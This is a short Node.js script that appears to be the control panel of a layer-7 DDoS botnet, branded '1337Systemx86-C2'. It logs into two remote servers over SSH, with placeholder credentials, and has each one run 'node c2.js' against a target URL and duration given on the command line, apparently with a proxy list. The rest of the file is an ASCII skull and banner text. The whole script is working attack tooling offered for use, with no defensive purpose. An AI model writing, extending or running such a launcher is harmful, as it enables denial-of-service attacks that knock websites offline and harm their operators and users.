const { readFileSync } = require('fs');

const { Client } = require('ssh2');

const conn = new Client();
const conn1 = new Client();

var url = process.argv[2]

var time = process.argv[3]

conn.on('ready', () => {
  conn.shell((err, stream) => {
    if (err) throw err;
    stream.on('close', () => {
    }).on('data', (data) => {
    });
    stream.end('node c2.js ' + url + ' ' + time + ' http.txt\nexit\n');
  });
}).connect({
  host: '???',
  port: 22,
  username: '???',
  password: '???'
});
console.log('Client > 1 connected');




conn1.on('ready', () => {
  conn1.shell((err, stream) => {
    if (err) throw err;
    stream.on('close', () => {
    }).on('data', (data) => {
    });
    stream.end('node c2.js ' + url + ' ' + time + ' http.txt\nexit\n');
  });
})
conn1.connect({
  host: '???',
  port: 22,
  username: '???',
  password: '???'
});

console.log('Client > 2 connected');

      console.log("");
console.log("                        $$$$$$$$$$$$$$$$$$$$$$$");
console.log("                    $$$$___$$$$$$$$$$$$$$$$$$$$$");
console.log("                  $$$$______$$$$$$$$$$$$$$$$$$$$$$");
console.log("                $$$$$________$$$$$$$$$$$$$$$$$$$$$$$");
console.log("               $$$$$__________$$$$$$$$$$$$$$$$$$$$$$$");
console.log("              $$$$$____________$$$$$$$$$$$$$$$$$$$$$$$");
console.log("             $$$$$$____________$$$$$$$$$$$$$$$$$$$$$$$$");
console.log("             $$$$$$___________$$$$$$$$$___________$$$$$$");
console.log("             $$…$$$$$_________$$$_$$$_$$$_________$$$$$$");
console.log("             $$$$$$$$______$$$$___$___$$$$______$$$$$$$$");
console.log("             $$$$$$$$$$$$$$$$$___$$$___$$$$$$$$$$$$$$$$$");
console.log("             $$$_$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_o$$");
console.log("             $$$__$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$__$$$");
console.log("              $$$__$’$$$$$$$$$$$$$$$$$$$$$$$$$$$$$__o$$$");
console.log("              ’$$o__$$__$$’$$$$$$$$$$$$$$’$$__$$_____o$$");
console.log("                $$o$____$$__’$$’$$’$$’__$$______$___o$$");
console.log("                 $$$o$__$____$$___$$___$$_____$$__o$");
console.log("                  ’$$$$O$____$$____$$___$$ ____o$$$");
console.log("                     ’$$o$$___$$___$$___$$___o$$$");
console.log("                       ’$$$$o$o$o$o$o$o$o$o$$$$");
console.log("");


    console.log("\033[97m            [\033[31m 1337Systemx86-C2 CNC PANEL LAYER-7 \033[31m]\r\n");
    console.log("\x1B[36m [1337Systemx86-C2] \x1B[36m C2 Destroyer > " + url );
    console.log("");
    console.log("\x1B[36m [1337Systemx86-C2] C2 Control Panel made By DarlingSh & KDM");
    console.log("");
